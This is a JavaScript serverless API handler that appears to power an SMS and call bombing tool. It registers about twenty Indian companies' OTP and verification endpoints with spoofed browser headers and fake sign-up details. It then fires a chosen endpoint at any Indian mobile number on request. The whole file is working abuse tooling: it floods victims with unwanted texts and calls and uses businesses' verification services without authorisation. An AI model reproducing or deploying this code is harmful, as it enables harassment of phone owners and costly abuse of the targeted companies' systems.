// ═══════════════════════════════════════════════════════════════════
//  USER AGENTS
// ═══════════════════════════════════════════════════════════════════
const UA_MOBILE = 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36';
const UA_DESKTOP = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// ═══════════════════════════════════════════════════════════════════
//  ENDPOINT REGISTRY
// ═══════════════════════════════════════════════════════════════════
const ENDPOINTS = [
  // ─── GET-BASED (most reliable) ──────────────────────────────────
  {
    id: 'oyo',
    method: 'GET',
    url: n => `https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://www.oyorooms.com',
      'Referer': 'https://www.oyorooms.com/'
    }
  },
  {
    id: 'delhivery',
    method: 'GET',
    url: n => `https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://direct.delhivery.com',
      'Referer': 'https://direct.delhivery.com/'
    }
  },
  {
    id: 'confirmtkt',
    method: 'GET',
    url: n => `https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://www.confirmtkt.com',
      'Referer': 'https://www.confirmtkt.com/'
    }
  },
  {
    id: 'magicbricks',
    method: 'GET',
    url: n => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=${n}`,
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
      'Referer': 'https://www.magicbricks.com/'
    }
  },
  {
    id: 'myupchar',
    method: 'GET',
    url: n => `https://www.myupchar.com/user_profile/resend_otp_via_voice?id=${n}`,
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://www.myupchar.com/'
    }
  },
  {
    id: 'makaan',
    method: 'GET',
    url: n => `https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/${n}?callType=otpOnCall`,
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': 'application/json, text/plain, */*',
      'Referer': 'https://www.makaan.com/'
    }
  },

  // ─── POST FORM-ENCODED ──────────────────────────────────────────
  {
    id: 'netmeds',
    method: 'POST',
    url: 'https://m.netmeds.com/sociallogin/popup/nmsgetcode/',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': '*/*',
      'Origin': 'https://m.netmeds.com',
      'Referer': 'https://m.netmeds.com/customer/account/login/',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: n => `register_mobileno=${n}&logintype=Otp&uniq_identy=quWqfunF&forget_pwd=N`
  },
  {
    id: 'lenskart',
    method: 'POST',
    url: 'https://www.ref-r.com/clients/lenskart/smsApi',
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: n => `mobile=${n}&submit=1`
  },
  {
    id: 'practo',
    method: 'POST',
    url: 'https://accounts.practo.com/send_otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-DROID-VERSION': '4.12.5',
      'API-Version': '2.0',
      'client-version': 'Android-4.12.5',
      'X-DROID-VERSION-CODE': '158',
      'client-name': 'Practo Android App'
    },
    body: n => `client_name=Practo+Android+App&fingerprint=&mobile=%2B91${n}&device_name=samsung+SM-G9350`
  },
  {
    id: 'goibibo',
    method: 'POST',
    url: 'https://www.goibibo.com/common/downloadsms/',
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://www.goibibo.com',
      'Referer': 'https://www.goibibo.com/mobile/?sms=success'
    },
    body: n => `mbl=${n}`
  },
  {
    id: 'apollopharmacy',
    method: 'POST',
    url: 'https://www.apollopharmacy.in/sociallogin/mobile/sendotp/',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': '*/*',
      'Origin': 'https://www.apollopharmacy.in',
      'Referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: n => `mobile=${n}`
  },
  {
    id: 'grab',
    method: 'POST',
    url: 'https://api.grab.com/grabid/v1/phone/otp',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: n => `method=SMS&countryCode=91&phoneNumber=${n}&templateID=pax_android_production`
  },
  {
    id: 'tllms',
    method: 'POST',
    url: 'https://marketing.tllms.com/elearn/api/v4/authentications/phone_call',
    headers: {
      'User-Agent': UA_DESKTOP,
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: n => `mobile=%2B91-${n}`
  },
  {
    id: 'realestateindia',
    method: 'POST',
    url: 'https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'text/html, */*; q=0.01',
      'Origin': 'https://www.realestateindia.com',
      'Referer': 'https://www.realestateindia.com/thanks.php?newreg',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: n => `action_id=call_to_otp&mob_num=${n}&member_id=1547045`
  },
  {
    id: 'aala',
    method: 'POST',
    url: 'https://www.aala.com/accustomer/ajax/getOTP',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Origin': 'https://www.aala.com',
      'Referer': 'https://www.aala.com/',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest'
    },
    body: n => `email=91${n}&firstname=SpeedX&lastname=SpeedX`
  },
  {
    id: 'flipkart_form',
    method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/otp/generate',
    headers: {
      'User-Agent': UA_DESKTOP,
      'Accept': '*/*',
      'Origin': 'https://www.flipkart.com',
      'Referer': 'https://www.flipkart.com/',
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop'
    },
    body: n => `loginId=%2B91${n}&state=VERIFIED&churnEmailRequest=false`
  },

  // ─── POST JSON ──────────────────────────────────────────────────
  {
    id: 'goomo',
    method: 'POST',
    url: 'https://client-api.goomo.com/v2/phone_confirmation/verify_user',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': '*/*',
      'Origin': 'https://www.goomo.com',
      'Referer': 'https://www.goomo.com/hotels',
      'Content-Type': 'application/json',
      'client': 'm-web',
      'x-goomo-platform': 'mWeb'
    },
    body: n => JSON.stringify({ email: 'fakeemail@gmail.com', phone_number: n, country_code: '91' })
  },
  {
    id: 'pizzahut',
    method: 'POST',
    url: 'https://m.pizzahut.co.in/api/cart/send-otp?langCode=en',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://m.pizzahut.co.in',
      'Referer': 'https://m.pizzahut.co.in/login',
      'Content-Type': 'application/json',
      'languagecode': 'en',
      'x-source-origin': 'PWAFW'
    },
    body: n => JSON.stringify({ customer: { MobileNo: n, UserName: n, merchantId: '98d18d82-ba59-4957-9c92-3f89207a34f6' } })
  },
  {
    id: 'ajio',
    method: 'POST',
    url: 'https://www.ajio.com/api/auth/signupSendOTP',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json',
      'Origin': 'https://www.ajio.com',
      'Referer': 'https://www.ajio.com/signup',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ firstName: 'SpeedX', login: 'johnyaho@gmail.com', password: 'Rock@5star', genderType: 'Male', mobileNumber: n, requestType: 'SENDOTP' })
  },
  {
    id: 'altbalaji',
    method: 'POST',
    url: 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://lite.altbalaji.com',
      'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
      'Content-Type': 'application/json;charset=UTF-8'
    },
    body: n => JSON.stringify({ country_code: '91', phone_number: n })
  },
  {
    id: 'olx',
    method: 'POST',
    url: 'https://www.olx.in/api/challenges',
    headers: {
      'User-Agent': UA_MOBILE,
      'Accept': '*/*',
      'Origin': 'https://www.olx.in',
      'Referer': 'https://www.olx.in/',
      'Content-Type': 'application/json'
    },
    body: n => JSON.stringify({ type: 'call', descriptor: `+91${n}` })
  }
];

// ═══════════════════════════════════════════════════════════════════
//  CORS
// ═══════════════════════════════════════════════════════════════════
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

// ═══════════════════════════════════════════════════════════════════
//  VALIDATION
// ═══════════════════════════════════════════════════════════════════
function validNumber(n) {
  return typeof n === 'string' && /^[6-9]\d{9}$/.test(n);
}

function validEndpointId(id) {
  return ENDPOINTS.some(e => e.id === id);
}

// ═══════════════════════════════════════════════════════════════════
//  FIRE ENDPOINT — bug-free
// ═══════════════════════════════════════════════════════════════════
async function fireEndpoint(endpoint, phone) {
  const start = Date.now();
  const url = typeof endpoint.url === 'function' ? endpoint.url(phone) : endpoint.url;
  const body = endpoint.body ? endpoint.body(phone) : undefined;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 5000);

  try {
    const res = await fetch(url, {
      method: endpoint.method,
      headers: endpoint.headers,
      body,
      signal: controller.signal,
      redirect: 'follow'
    });

    clearTimeout(timeoutId);

    return {
      ok: res.status >= 200 && res.status < 300,
      status: res.status,
      latencyMs: Date.now() - start
    };
  } catch (err) {
    clearTimeout(timeoutId);

    return {
      ok: false,
      status: err.name === 'AbortError' ? 'timeout' : 'network_error',
      error: err.message,
      latencyMs: Date.now() - start
    };
  }
}

// ═══════════════════════════════════════════════════════════════════
//  HANDLER
// ═══════════════════════════════════════════════════════════════════
export default async function handler(req, res) {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, CORS);
    return res.end();
  }

  for (const [k, v] of Object.entries(CORS)) res.setHeader(k, v);

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'method_not_allowed' });
  }

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  body = body || {};

  const { endpointId, phone } = body;

  if (!validNumber(phone)) {
    return res.status(400).json({ ok: false, error: 'invalid_phone' });
  }

  if (!validEndpointId(endpointId)) {
    return res.status(400).json({ ok: false, error: 'invalid_endpoint' });
  }

  const endpoint = ENDPOINTS.find(e => e.id === endpointId);
  const result = await fireEndpoint(endpoint, phone);

  return res.status(200).json({
    ok: result.ok,
    endpoint: endpoint.id,
    upstreamStatus: result.status,
    latencyMs: result.latencyMs,
    error: result.error
  });
}

export const config = {
  api: { bodyParser: { sizeLimit: '1kb' } }
};
